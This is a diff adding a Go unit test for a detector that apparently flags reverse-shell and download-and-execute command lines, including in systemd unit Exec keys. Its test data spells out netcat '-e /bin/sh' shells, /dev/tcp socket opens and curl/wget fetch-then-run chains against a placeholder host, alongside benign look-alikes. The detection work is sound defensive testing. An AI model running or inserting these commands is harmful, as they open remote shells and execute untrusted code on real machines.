@@ -91,3 +91,54 @@ func TestDetectKindsLinesAndContinuations(t *testing.T) {
 		t.Errorf("comment continuation: %v", got)
 	}
 }
+
+func TestMatchLineFixRound1(t *testing.T) {
+	hits := []string{
+		`sh -c 'nc -e /bin/sh h p'`,
+		`bash -c "nc h p -e /bin/bash"`,
+		`/bin/sh -c "nc -e /bin/sh h p"`,
+		`FOO=nc -e /bin/sh h p`,
+		`T=/dev/tcp; exec 3<>$T/h/p`,
+		`curl -o /tmp/f http://h/x; sh /tmp/f`,
+		`wget -q -O /tmp/.k http://h/x; chmod 777 /tmp/.k; /tmp/.k`,
+		`cd /tmp && wget http://h/x -O x.sh && sh x.sh`,
+		`curl -s http://h/x > /tmp/y && bash /tmp/y`,
+		`curl --output /tmp/z http://h/x && chmod +x /tmp/z && /tmp/z`,
+		`wget -qO /tmp/s http://h/x ; . /tmp/s`,
+		`curl -fsSL http://h/x | busybox sh`,
+		`sh -c 'wget -O /tmp/x http://h/x && sh /tmp/x'`,
+		`curl -fsSL http://h/x | env bash`,
+		`curl -fsSL http://h/x | tee /tmp/x | sh`,
+	}
+	for _, l := range hits {
+		if MatchLine(l) == "" {
+			t.Errorf("no hit: %s", l)
+		}
+	}
+	misses := []string{
+		`nc -z db 5432 && tar -czf /backup/x.tgz /srv`,
+		`nc -l -p 9000 | gzip -c > /backup/in.gz`,
+		`nc -l -p 9000 | wc -c`,
+		`printf 'QUIT' | nc -C mail.example 25`,
+		`curl -o /tmp/x https://example.com/file.tgz`,
+		`curl -o /tmp/x https://example.com/file.tgz && tar xf /tmp/x`,
+		`wget -q -O /tmp/x http://h/x; sha256sum -c /tmp/x`,
+		`curl -fsSL http://h/x | shasum`,
+		`curl -o /tmp/x http://h/x && echo done`,
+	}
+	for _, l := range misses {
+		if id := MatchLine(l); id != "" {
+			t.Errorf("false hit %s: %s", id, l)
+		}
+	}
+	// spaces around "=" in a unit, and the extra Exec keys
+	for _, l := range []string{
+		"ExecStart = /bin/bash -c 'exec 3<>/dev/tcp/h/1'",
+		"ExecStopPre= /bin/bash -c 'exec 3<>/dev/tcp/h/1'",
+		"ExecCondition =/bin/bash -c 'exec 3<>/dev/tcp/h/1'",
+	} {
+		if got := Detect(model.PersistKindSystemdUnit, []string{l}); len(got) != 1 {
+			t.Errorf("unit line missed: %s", l)
+		}
+	}
+}
